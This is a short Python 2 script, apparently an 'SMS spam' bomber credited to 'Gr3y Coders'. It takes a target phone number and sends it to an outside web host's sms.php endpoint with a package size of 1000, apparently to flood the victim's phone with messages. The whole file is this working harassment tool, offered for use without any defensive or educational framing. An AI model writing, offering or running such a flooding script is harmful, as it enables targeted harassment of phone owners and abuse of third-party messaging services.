import os, time, sys, urllib2, random

def run(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00.01)

os.system('clear')

try:
    run("""\x1b[1;91m____ ___  ____ _  _    ____ _  _ ____ 
[__  |__] |__| |\/|    [__  |\/| [__  
\x1b[1;97m___] |    |  | |  |    ___] |  | ___] \n*Author : \x1b[1;91mGr3y \x1b[1;97m Coders\n""")
    no = raw_input('[\x1b[1;91m*\x1b[1;97m] Input Number : ')
    print('[\x1b[1;91m+\x1b[1;97m] Sending...')
    urllib2.urlopen('https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor=%s&paket=1000' % no)
    print('[\x1b[1;92m+\x1b[1;97m] Sending Successfully\n')
except:
    print '[\x1b[1;91m!\x1b[1;97m] Sending Failed'
    exit('[\x1b[1;91m!\x1b[1;97m] Exit\n')